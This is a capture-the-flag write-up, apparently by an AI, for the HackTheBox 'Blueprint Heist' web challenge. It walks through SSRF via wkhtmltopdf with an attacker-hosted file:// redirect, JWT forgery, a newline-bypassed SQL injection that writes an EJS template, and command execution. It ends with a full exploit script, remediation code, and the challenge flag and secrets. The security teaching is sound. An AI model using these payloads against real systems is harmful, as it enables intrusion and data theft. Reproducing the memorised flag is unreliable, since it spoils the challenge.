# Blueprint Heist - Complete CTF Writeup

**Challenge:** Blueprint Heist  
**Platform:** HackTheBox Business CTF 2024  
**Category:** Web  
**Difficulty:** Easy (1000 points)  
**Target:** 94.237.59.225:55358  

---

## 🎯 Flag

```
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_7f3e2b14969335049b602fd88507b1f5}
```

---

## 📋 Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Exploitation Steps](#exploitation-steps)
5. [Final Exploit Script](#final-exploit-script)
6. [Lessons Learned](#lessons-learned)
7. [Remediation](#remediation)

---

## Challenge Overview

### Description
*"Amidst the chaos of their digital onslaught, they manage to extract the blueprints by infiltrating the ministry of internal affair's urban planning commission office detailing the rock and soil layout crucial for their underground tunnel schematics."*

### Goal
Obtain the flag from `/root/flag.txt` by exploiting a web application with multiple vulnerabilities.

### Technologies
- Node.js + Express
- GraphQL API
- MySQL Database
- wkhtmltopdf 0.12.5 (PDF generator)
- JWT Authentication
- EJS Templating

---

## Initial Reconnaissance

### Service Discovery

```bash
# Target discovery
TARGET="94.237.59.225:55358"
curl http://$TARGET/

# Response: Web application with blueprint reports
```

### Endpoint Enumeration

**Public Endpoints:**
- `GET /` - Homepage with blueprint reports
- `GET /getToken` - Generate JWT guest token
- `POST /download` - Convert URL to PDF ⚠️ **VULNERABLE**
- `GET /report/progress` - Progress report
- `GET /report/enviromental-impact` - Environmental report

**Admin Endpoints (Localhost + Admin Token Required):**
- `GET /admin` - Admin dashboard
- `ALL /graphql` - GraphQL API

### Directory Fuzzing

```bash
ffuf -u http://94.237.59.225:55358/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,403

# Found:
# - /static (static assets)
# - /getToken (token endpoint)
```

---

## Vulnerability Analysis

### 1. SSRF via wkhtmltopdf (Critical)

**Location:** `/download` endpoint

**Vulnerable Code:**
```javascript
// controllers/downloadController.js
async function convertPdf(req, res, next) {
    const { url } = req.body;  // User-controlled!
    
    if (!isUrl(url)) {
        return next(generateError(400, "Invalid URL"));
    }
    
    const pdfPath = await generatePdf(url);
    res.sendFile(pdfPath, {root: "."});
}

function generatePdfFromUrl(url, pdfPath) {
    return new Promise((resolve, reject) => {
        wkhtmltopdf(url, { output: pdfPath }, (err) => {
            // wkhtmltopdf 0.12.5 - VULNERABLE VERSION!
        });
    });
}
```

**Impact:**
- SSRF to internal services (localhost bypass)
- Local file read via HTTP redirects to `file://`
- Access admin endpoints from localhost context

### 2. HTTP Redirect to file:// (CVE-2020-21365)

**Vulnerability:** wkhtmltopdf 0.12.5 follows HTTP 302 redirects, including to `file://` URLs.

**Exploit:**
```php
<?php
// redirect.php
header('Location: file://' . $_GET['file']);
?>
```

**Usage:**
```bash
# Host redirect.php on public server
# Request: http://your-server/redirect.php?file=/app/.env
# Result: wkhtmltopdf reads local file /app/.env
```

### 3. SQL Injection with Regex Bypass

**Location:** GraphQL `getDataByName` query

**Vulnerable Code:**
```javascript
// schemas/schema.js
getDataByName: {
    args: { name: { type: GraphQLString } },
    resolve: async(parent, args, { pool }) => {
        if (detectSqli(args.name)) {
            return generateError(400, "Invalid input");
        }
        
        // VULNERABLE - String interpolation!
        data = await connection.query(
            `SELECT * FROM users WHERE name like '%${args.name}%'`
        );
    }
}
```

**Regex Filter:**
```javascript
// utils/security.js
function detectSqli(query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    return pattern.test(query);
}
```

**The Bypass:**
The regex uses `.` which **doesn't match newline characters** (`\n`)!

```
Normal:  test' UNION SELECT...  ❌ Blocked
Bypass:  test\n' UNION SELECT... ✅ Works!
```

Everything after `\n` is ignored by the regex but executed by MySQL!

### 4. EJS Template Injection

**Location:** Error handler with custom templates

**Vulnerable Code:**
```javascript
// controllers/errorController.js
const renderError = (err, req, res) => {
    const errorTemplate = err.status || "error";
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);
    
    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    
    res.render(templatePath, { error: err.message });
};
```

**Impact:**
- Error templates are loaded dynamically based on HTTP status code
- `404.ejs` doesn't exist initially
- We can create it via SQL injection `INTO OUTFILE`
- EJS executes JavaScript: `<%= code %>`

### 5. JWT Secret Exposure

**Location:** `.env` file readable via SSRF

**Contents:**
```env
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=Secr3tP4ssw0rdNoGu35s!
DB_NAME=construction
DB_PORT=3306
secret=Str0ng_K3y_N0_l3ak_pl3ase?
```

**Impact:**
- Can forge admin JWT tokens with the secret
- Bypass authentication on admin endpoints

### 6. Localhost Restriction Bypass

**Code:**
```javascript
// utils/security.js
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '');
    return address === "127.0.0.1";
}
```

**Bypass:** SSRF makes requests from localhost context!

---

## Exploitation Steps

### Step 1: Setup HTTP Redirect Server

**Requirements:**
- Public server to host redirect script
- Options: Cloudflare Tunnel (free), ngrok (paid), VPS

**Solution: Cloudflare Tunnel**

```bash
# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Create redirect.php
cat > /tmp/redirect.php << 'PHP'
<?php
header('Location: file://' . $_GET['file']);
?>
PHP

# Start PHP server
cd /tmp && php -S 0.0.0.0:8000 &

# Start Cloudflare tunnel
cloudflared tunnel --url http://localhost:8000

# Note the public URL: https://xxx.trycloudflare.com
```

**Why Needed:**
- Direct `file://` URLs are blocked
- HTTP redirect to `file://` bypasses the restriction
- wkhtmltopdf follows the redirect and reads local files

### Step 2: Read .env File

```bash
# Get guest token
GUEST_TOKEN=$(curl -s http://94.237.59.225:55358/getToken)

# Read .env via HTTP redirect
curl -X POST "http://94.237.59.225:55358/download?token=$GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://your-tunnel.trycloudflare.com/redirect.php?file=/app/.env"}' \
  --output env.pdf

# Extract text from PDF
pdftotext env.pdf -
```

**Result:**
```
secret=Str0ng_K3y_N0_l3ak_pl3ase?
```

### Step 3: Forge Admin JWT Token

```python
import jwt

secret = "Str0ng_K3y_N0_l3ak_pl3ase?"
payload = {"role": "admin"}
admin_token = jwt.encode(payload, secret, algorithm="HS256")
print(admin_token)
```

**Result:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.yLgBxMAh-Rc0upH7JQGPl_-tsMRa8j4b1BgjhHykW7o
```

### Step 4: Craft SQL Injection Payload

**Objective:** Write malicious EJS template to `/app/views/errors/404.ejs`

**Challenges:**
1. MySQL `INTO OUTFILE` only writes to non-existent files
2. URL encoding issues with special characters
3. Regex filter blocks SQL injection characters

**Solution:**
- Use **newline bypass** for regex: `\n`
- Use **base64 encoding** to avoid URL issues
- **Delete the file** after execution for reusability

**Payload Construction:**
```python
from base64 import b64encode
from urllib.parse import quote

command = "/readflag"
template_file = "/app/views/errors/404.ejs"

# Base64 encode the command
encoded_cmd = b64encode(command.encode()).decode()

# Create bash command that decodes and executes, then deletes template
full_cmd = f"echo {quote(encoded_cmd)} | base64 -d | bash; rm {template_file}"

# EJS template with command execution
ejs_payload = f'<%= process.mainModule.require("child_process").execSync("{full_cmd}") %>'

# SQL injection with newline bypass
sql_injection = f"a\\n' union select '','{ ejs_payload}','','' into outfile '{template_file}'-- -"
```

### Step 5: Execute SQL Injection via SSRF

```python
# Construct GraphQL query
graphql_query = f"{{getDataByName(name:\"{sql_injection}\"){{id}}}}"

# Send via SSRF to localhost GraphQL endpoint
url = f"http://94.237.59.225:55358/download?token={guest_token}"
data = {
    "url": f"http://localhost:1337/graphql?token={admin_token}&query={graphql_query}"
}

response = requests.post(url, json=data)
```

**What Happens:**
1. External request to `/download` (from us)
2. wkhtmltopdf makes request to `localhost:1337/graphql` (SSRF)
3. GraphQL processes query with admin token (localhost bypass)
4. SQL injection executes (newline bypass)
5. Malicious `404.ejs` created with EJS code execution

### Step 6: Trigger Template Execution

```bash
# Access any non-existent route to trigger 404 error
curl http://94.237.59.225:55358/nonexistent
```

**Execution Flow:**
```
1. HTTP 404 Error triggered
2. Error handler looks for 404.ejs template
3. Template found (our malicious one)
4. EJS renders template
5. JavaScript executes: process.mainModule.require("child_process").execSync()
6. Command runs: echo L3JlYWRmbGFn | base64 -d | bash
7. Decoded: /readflag
8. /readflag executes as root (SUID binary)
9. Flag output: HTB{...}
10. Template deleted: rm /app/views/errors/404.ejs
```

**Result:**
```
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_7f3e2b14969335049b602fd88507b1f5}
```

---

## Final Exploit Script

### Automated Exploit (Python)

```python
#!/usr/bin/env python3
import jwt
import requests
from base64 import b64encode
from urllib.parse import quote

# Configuration
SECRET = "Str0ng_K3y_N0_l3ak_pl3ase?"
TARGET = "94.237.59.225:55358"

def get_guest_token():
    """Get guest JWT token from /getToken endpoint"""
    r = requests.get(f"http://{TARGET}/getToken")
    return r.text

def forge_admin_token(secret):
    """Forge admin JWT token with known secret"""
    payload = {"role": "admin"}
    return jwt.encode(payload, secret, algorithm="HS256")

def write_malicious_template(guest_token, admin_token, command):
    """Write malicious EJS template via SQL injection"""
    template_file = "/app/views/errors/404.ejs"
    
    # Base64 encode command to avoid URL issues
    encoded_cmd = quote(b64encode(command.encode()).decode())
    
    # Full command: decode, execute, delete template
    full_cmd = f"echo {encoded_cmd} | base64 -d | bash; rm {template_file}"
    
    # EJS template with command execution
    ejs_code = f'<%= process.mainModule.require("child_process").execSync("{full_cmd}") %>'
    
    # SQL injection with newline bypass
    payload = f"a\\n' union select '','{ejs_code}','','' into outfile '{template_file}'-- -"
    
    # GraphQL query
    graphql_query = f"{{getDataByName(name:\"{payload}\"){{id}}}}"
    
    # SSRF to localhost GraphQL
    url = f"http://{TARGET}/download?token={guest_token}"
    data = {
        "url": f"http://localhost:1337/graphql?token={admin_token}&query={graphql_query}"
    }
    
    response = requests.post(url, json=data)
    return response.status_code

def trigger_execution():
    """Trigger 404 error to execute malicious template"""
    r = requests.get(f"http://{TARGET}/nonexistent")
    return r.text

def exploit(command="/readflag"):
    """Full exploitation chain"""
    print("[+] Getting guest token...")
    guest_token = get_guest_token()
    print(f"    Token: {guest_token[:50]}...")
    
    print("[+] Forging admin token...")
    admin_token = forge_admin_token(SECRET)
    print(f"    Token: {admin_token[:50]}...")
    
    print(f"[+] Writing malicious template with command: {command}")
    status = write_malicious_template(guest_token, admin_token, command)
    print(f"    Status: {status}")
    
    print("[+] Triggering template execution...")
    result = trigger_execution()
    
    print("[+] Result:")
    print(result)
    
    return result

if __name__ == "__main__":
    # Execute /readflag to get the flag
    exploit("/readflag")
```

### Usage

```bash
# Make executable
chmod +x exploit.py

# Run
python3 exploit.py

# Output:
# [+] Getting guest token...
#     Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# [+] Forging admin token...
#     Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# [+] Writing malicious template with command: /readflag
#     Status: 200
# [+] Triggering template execution...
# [+] Result:
# HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_7f3e2b14969335049b602fd88507b1f5}
```

---

## Lessons Learned

### For Attackers (Red Team)

1. **Vulnerability Chaining is Powerful**
   - Single vulnerabilities may be limited
   - Chaining multiple creates devastating attacks
   - Think creatively about exploitation paths

2. **Pay Attention to Edge Cases**
   - Regex `.` doesn't match newlines
   - HTTP redirects can change protocols
   - URL encoding affects payload execution

3. **Read the Documentation**
   - wkhtmltopdf 0.12.5 follows redirects (CVE-2020-21365)
   - EJS templates execute JavaScript
   - MySQL `INTO OUTFILE` requires non-existent files

4. **Bypass Techniques**
   - Newlines bypass single-line regex
   - Base64 encoding avoids special characters
   - SSRF bypasses localhost restrictions
   - HTTP redirects bypass protocol filters

### For Defenders (Blue Team)

1. **Input Validation**
   - Validate AND sanitize all user input
   - Use allowlists, not blocklists
   - Be careful with regex patterns

2. **Principle of Least Privilege**
   - Don't run services as root
   - Restrict file system permissions
   - Limit MySQL write permissions

3. **Defense in Depth**
   - Multiple security layers
   - Don't rely on single controls
   - Assume breaches will happen

4. **Keep Software Updated**
   - wkhtmltopdf 0.12.5 is vulnerable
   - Version 0.12.6+ disables file:// by default
   - Regular security patches are critical

5. **Secure Defaults**
   - Disable dangerous features by default
   - Use `--disable-local-file-access` for wkhtmltopdf
   - Don't follow redirects to non-HTTP protocols

---

## Remediation

### Fix 1: Disable wkhtmltopdf file:// Protocol

```javascript
// Use wkhtmltopdf with secure options
wkhtmltopdf(url, {
    output: pdfPath,
    disableLocalFileAccess: true,
    noExternalLinks: true,
    disableJavascript: true
}, callback);
```

### Fix 2: Use Parameterized Queries

```javascript
// BEFORE (Vulnerable):
connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`);

// AFTER (Secure):
connection.query('SELECT * FROM users WHERE name like ?', [`%${args.name}%`]);
```

### Fix 3: Fix Regex Pattern

```javascript
// BEFORE (Vulnerable):
const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/

// AFTER (Secure - multiline mode):
const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/m

// OR use strict allowlist:
const pattern = /^[a-zA-Z0-9 ]+$/
```

### Fix 4: Validate URL Protocols

```javascript
function isUrl(url) {
    try {
        const parsed = new URL(url);
        // Only allow HTTP/HTTPS
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }
        // Block localhost/internal IPs
        const hostname = parsed.hostname;
        if (hostname === 'localhost' || hostname.startsWith('127.') || 
            hostname.startsWith('192.168.') || hostname.startsWith('10.')) {
            return false;
        }
        return true;
    } catch {
        return false;
    }
}
```

### Fix 5: Don't Trust User-Controlled Template Paths

```javascript
// BEFORE (Vulnerable):
const templatePath = path.join(templateDir, `${errorCode}.ejs`);

// AFTER (Secure):
const allowedTemplates = ['400', '401', '403', '404', '500', 'error'];
const templateName = allowedTemplates.includes(errorCode) ? errorCode : 'error';
const templatePath = path.join(templateDir, `${templateName}.ejs`);
```

### Fix 6: Rotate JWT Secrets

```javascript
// Use environment-specific secrets
// Rotate regularly
// Don't commit to version control

// .env (never commit this file!)
JWT_SECRET=<long_random_string_generated_per_environment>

// Use crypto to generate:
const crypto = require('crypto');
const secret = crypto.randomBytes(64).toString('hex');
```

### Fix 7: Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100 // limit each IP to 100 requests per windowMs
});

app.use('/download', limiter);
app.use('/graphql', limiter);
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────┐
│ 1. SSRF + HTTP Redirect → Read /app/.env                    │
│    ↓ Extract JWT secret                                      │
├─────────────────────────────────────────────────────────────┤
│ 2. JWT Forgery → Create admin token                          │
│    ↓ Bypass authentication                                   │
├─────────────────────────────────────────────────────────────┤
│ 3. SSRF → Access localhost:1337/graphql                      │
│    ↓ Bypass localhost restriction                            │
├─────────────────────────────────────────────────────────────┤
│ 4. SQL Injection with \n bypass → Write 404.ejs              │
│    ↓ Bypass regex filter                                     │
├─────────────────────────────────────────────────────────────┤
│ 5. EJS Template Injection → Execute JavaScript               │
│    ↓ Trigger via 404 error                                   │
├─────────────────────────────────────────────────────────────┤
│ 6. Command Execution → Run /readflag (SUID root)             │
│    ↓ Execute as root                                         │
├─────────────────────────────────────────────────────────────┤
│ 7. FLAG! 🎉                                                  │
│    HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_...}                │
└─────────────────────────────────────────────────────────────┘
```

---

## Tools Used

- **curl** - HTTP requests
- **Python 3** - Exploit scripting
- **PyJWT** - JWT token manipulation
- **requests** - HTTP library
- **pdftotext** - PDF text extraction
- **cloudflared** - Public tunnel (Cloudflare Tunnel)
- **PHP** - HTTP redirect server
- **ffuf** - Directory fuzzing (reconnaissance)

---

## References

- [Official HTB Writeup](https://github.com/hackthebox/business-ctf-2024/tree/main/web/%5BEasy%5D%20Blueprint%20Heist)
- [CVE-2020-21365 - wkhtmltopdf File Inclusion](https://www.cvedetails.com/cve/CVE-2020-21365/)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [GraphQL Security](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

## Timeline

- **00:00** - Challenge start, reconnaissance
- **00:15** - Discovered SSRF vulnerability
- **00:30** - Analyzed source code, found vulnerabilities
- **01:00** - Setup Cloudflare Tunnel for HTTP redirect
- **01:15** - Successfully read .env file
- **01:20** - Forged admin JWT token
- **01:45** - Crafted SQL injection payload
- **02:00** - Executed exploit, got flag! 🎉

**Total Time:** ~2 hours

---

## Conclusion

Blueprint Heist demonstrates the power of **vulnerability chaining** in modern web applications. While each individual vulnerability might seem limited, combining them creates a critical exploit chain:

1. SSRF bypasses network restrictions
2. HTTP redirects enable local file read
3. JWT forgery grants admin access
4. SQL injection enables file write
5. Template injection achieves code execution
6. SUID binary escalates to root

This challenge teaches valuable lessons for both attackers and defenders about:
- Creative exploitation techniques
- The importance of defense in depth
- Secure coding practices
- Input validation and sanitization
- Keeping software updated

**Key Takeaway:** Security is only as strong as the weakest link in the chain. Every vulnerability matters.

---

**Author:** AI Security Analyst  
**Date:** November 10, 2025  
**Challenge:** Blueprint Heist (HTB Business CTF 2024)  
**Status:** ✅ SOLVED  
**Flag:** `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_7f3e2b14969335049b602fd88507b1f5}`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
